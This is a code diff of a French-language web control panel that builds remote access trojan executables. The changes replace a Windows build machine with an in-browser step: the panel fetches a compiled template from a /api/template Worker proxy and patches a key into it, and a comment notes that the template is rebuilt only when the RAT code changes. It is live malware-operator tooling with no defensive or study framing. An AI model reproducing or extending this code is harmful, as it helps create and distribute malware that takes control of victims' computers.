@@ -344,8 +344,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
         <div class="embed warning">
           <div class="embed-title">Infra</div>
           <div class="embed-body" style="color:var(--text-muted);font-size:13px;line-height:1.6;">
-            Le <b style="color:var(--text-main)">builder</b> doit tourner là où se trouve <span class="value">tttttt.py</span> + MinGW (PC Windows privé).
-            Render = fleet/login OK ; compile PE = host Windows (même hub_server, BUILD_ROOT).
+            Build = download template via <span class="value">/api/template</span> (Worker proxy) + patch key dans le navigateur. Pas de PC allumé. Rebuild template seulement si le code RAT change.
           </div>
         </div>
       </div>
@@ -536,7 +535,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
     btn.disabled=true; st.textContent='Download template + patch…';
     toast('BUILD STARTED','warn');
     try{
-      const tplUrl=window.NEX_TEMPLATE_URL||'';
+      const tplUrl=window.NEX_TEMPLATE_URL||(location.origin+'/api/template');
       if(!tplUrl || tplUrl.indexOf('YOUR_')>=0){
         st.textContent='NEX_TEMPLATE_URL manquant dans config.js';
         toast('BUILD FAILED','error'); btn.disabled=false; return;
@@ -550,7 +549,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
         b.set(e); return b;
       }
       const r=await fetch(tplUrl,{mode:'cors'});
-      if(!r.ok) throw new Error('template HTTP '+r.status+' (CORS ou URL)');
+      if(!r.ok) throw new Error('template HTTP '+r.status+' — deploy worker.js proxy /api/template');
       const buf=new Uint8Array(await r.arrayBuffer());
       function find(hay, needle){
         outer: for(let i=0;i<=hay.length-needle.length;i++){
